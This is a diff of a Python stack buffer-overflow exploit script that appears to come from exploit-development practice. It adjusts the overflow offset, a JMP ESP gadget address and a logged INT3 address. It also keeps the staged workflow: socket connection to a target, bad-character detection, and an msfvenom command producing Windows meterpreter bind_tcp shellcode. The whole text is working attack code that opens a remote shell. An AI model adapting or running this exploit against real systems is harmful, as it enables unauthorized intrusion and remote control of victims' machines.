@@ -7,11 +7,11 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
 
 # STAGE 0: cyclic pattern search
-buffer_size = 146
+buffer_size = 152
 
 # STAGE 0.5: gadget search (should not include bad chars, obviously)
 # !mona j -r esp
-jmp_esp = "\xbf\x16\x04\x08"
+jmp_esp = "\xa3\x14\x04\x08"
 
 # STAGE 1: badchar detection
 # null-terminator and \n by default
@@ -40,7 +40,7 @@ jmp_esp = "\xbf\x16\x04\x08"
 # 
 # s.send(payload)
 #
-# [13:23:25] INT3 command at 01511A0C
+# [13:23:25] INT3 command at 015719F4
 
 # STAGE 3: exploitation
 # msfvenom -p windows/meterpreter/bind_tcp -b '\x00\x0A' -f python --var-name shellcode EXITFUNC=thread
